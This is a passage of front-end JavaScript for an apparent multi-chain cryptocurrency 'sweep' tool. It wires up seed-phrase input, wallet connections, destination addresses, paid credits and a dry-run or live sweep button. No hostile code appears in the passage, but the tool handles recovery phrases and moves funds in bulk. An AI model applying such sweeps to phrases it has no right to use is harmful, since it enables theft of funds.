        console.warn('Claim info retry failed:', scrubSecret(err2.message));
      }
    });

  const snap = await fetchBalanceSnapshot();
  updateCreditsBadge(snap);

  $$('input[name=wallet-type]').forEach((radio) => {
    radio.addEventListener('change', (e) => {
      showWalletSection(e.target.value);
      hide('#connected-banner');
      syncMnemonicNotice();
      syncWalletTypeDefaults();
      invalidatePreview();
      if (e.target.value !== 'mnemonic') {
        $('#phrases').value = '';
      }
    });
  });

  const initialWalletType = $('input[name=wallet-type]:checked')?.value || 'extension';
  showWalletSection(initialWalletType);
  syncMnemonicNotice();
  syncWalletTypeDefaults();

  ['#family-evm', '#family-solana', '#family-bitcoin', '#family-tron'].forEach((sel) => {
    const el = $(sel);
    if (el) el.addEventListener('change', () => {
      syncDestinationFields();
      invalidatePreview();
    });
  });
  syncDestinationFields();
  trackChainTouches();

  $$('#chain-list input[type=checkbox]').forEach((cb) => {
    cb.addEventListener('change', invalidatePreview);
  });

  $('#phrases')?.addEventListener('input', invalidatePreview);

  const connectButtons = [
    ['#connect-button-extension',     'extension'],
    ['#connect-button-walletconnect', 'walletconnect'],
    ['#connect-button-ledger',        'ledger'],
    ['#connect-button-trezor',        'trezor'],
  ];
  for (const [sel, type] of connectButtons) {
    const btn = $(sel);
    if (!btn) continue;
    btn.addEventListener('click', () => connectWalletAndStoreForType(type));
  }

  $('#preview-button').addEventListener('click', runPreview);

  $('#run-button').addEventListener('click', async () => {
    const btn = $('#run-button');
    if (btn.disabled) return;
    const originalText = btn.textContent;
    const originalClass = btn.className;
    btn.disabled = true;
    btn.textContent = 'Running…';
    try {
      await runSweep(state.mode === 'live');
    } finally {
      btn.disabled = false;
      btn.textContent = originalText;
      btn.className = originalClass;
    }
  });

  $('#buy-credits-button')?.addEventListener('click', async () => {
    try {
      await requirePayment();
      const newSnap = await fetchBalanceSnapshot({ force: true });
      updateCreditsBadge(newSnap);
    } catch (err) { console.error('Buy credits failed:', scrubSecret(err.message)); }
  });

  $('#clear-button').addEventListener('click', async () => {
    if (state.wallet) { try { await state.wallet.dispose(); } catch {} }
    clearAll();
    stopCreditsBadgeTimer();
    $('#phrases').value = '';
    $('#dest-evm').value = '';
    clearLog();
    hide('#run-button');
    hide('#connected-banner');
  });

  $$('input[name=mode]').forEach((radio) => {
    radio.addEventListener('change', (e) => {
      state.mode = e.target.value;
      const runBtn = $('#run-button');
      if (runBtn) {
        runBtn.textContent = state.mode === 'live' ? '⚡ EXECUTE LIVE SWEEP' : '▶ Run Dry Sweep';
        runBtn.className = state.mode === 'live' ? 'btn btn-danger' : 'btn btn-primary';
      }
      const warning = $('#live-warning');
      if (warning) { warning.style.display = state.mode === 'live' ? '' : 'none'; }
    });
  });

  state.mode = 'dry-run';
});